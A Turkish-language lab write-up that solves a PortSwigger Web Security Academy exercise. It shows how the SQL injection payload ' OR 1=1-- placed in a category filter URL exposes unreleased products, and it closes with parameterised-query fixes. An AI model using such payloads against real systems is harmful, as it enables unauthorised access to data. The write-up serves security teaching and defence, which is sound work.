# PortSwigger — SQL injection: gizli veriyi çıkarma (WHERE)

| Alan | Değer |
| --- | --- |
| Platform | PortSwigger Web Security Academy |
| Lab | [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) |
| Seviye | Apprentice |
| Konu | SQL enjeksiyonu, `WHERE` cümlesi, yorum sözdizimi |

> Bu yazım halka açık bir laboratuvar içindir. Aynı teknik yalnızca yazılı izin verilen sistemlerde denenmelidir.

## Amaç

Mağaza uygulamasında yalnızca **yayınlanmış** ürünler listeleniyor. Kategori filtresini manipüle ederek **yayınlanmamış** ürünlerin de listelenmesini sağlamak.

## 1. Normal davranış

Lab açıldığında ürün listesi gelir. Kategorilerden birine tıkla (ör. **Gifts**). URL şu biçime döner:

```text
https://LAB-ID.web-security-academy.net/filter?category=Gifts
```

Sunucu tarafında çalışan sorgu kabaca şöyledir:

```sql
SELECT id, name, price FROM products WHERE category = 'Gifts' AND released = 1;
```

`released = 1` koşulu, yayınlanmamış ürünleri gizler.

## 2. Enjeksiyon noktası

`category` parametresi sorguya doğrudan string olarak ekleniyor. Tek tırnak (`'`) ile sorguyu bozup hata/yanıt değişimi gözlemleyebiliriz.

Deneme:

```text
filter?category=Gifts'
```

Beklenen: 500 veya boş liste. Bu, girdinin SQL'e ulaştığını gösterir.

## 3. Mantık koşulunu değiştirme

`WHERE` cümlesini her zaman doğru yapacak bir ifade ekleyelim:

```sql
' OR 1=1--
```

Tam URL:

```text
https://LAB-ID.web-security-academy.net/filter?category=Gifts' OR 1=1--
```

Oluşan sorgu:

```sql
SELECT id, name, price FROM products
WHERE category = 'Gifts' OR 1=1--' AND released = 1;
```

- `OR 1=1` tüm satırları koşula uygun hale getirir.
- `--` sonrasını yorum satırı yapar; `AND released = 1` devre dışı kalır.

Sonuç: yayınlanmamış ürünler de listelenir. Lab çözülür.

> Bazı veritabanlarında `--` sonrasında boşluk gerekir. URL'de bunu `--%20` veya `--+` olarak kodlayabilirsin. MySQL `#` yorumunu da kabul eder.

## 4. Neden çalıştı?

| Neden | Açıklama |
| --- | --- |
| String birleştirme | Girdi, parametre olarak değil sorgu metnine eklenerek gönderiliyor. |
| Kaçış yok | Tek tırnak kaçırılmıyor; string bağlamı kırılıyor. |
| Yorum sözdizimi | `--` ile kalan koşul etkisizleştiriliyor. |

## 5. Düzeltme

Parametreli sorgu / prepared statement kullan:

```ts
const rows = await db.query(
  'SELECT id, name, price FROM products WHERE category = $1 AND released = 1',
  [category],
);
```

Ek olarak:

- Girdi doğrulaması tek başına yeterli değildir; asıl çözüm parametreleştirmedir.
- Hata mesajlarında SQL ayrıntısı döndürme.
- En az yetkili veritabanı kullanıcısı.

## Öğrendiklerim

- `' OR 1=1--` klasik ama hâlâ öğretici: `WHERE` koşulunu tamamen değiştirir.
- Yorum sözdizimi veritabanına göre değişir (`--`, `#`, `/* */`).
- Enjeksiyonun çalıştığını anlamak için önce hatayı, sonra mantık değişimini gözlemle.
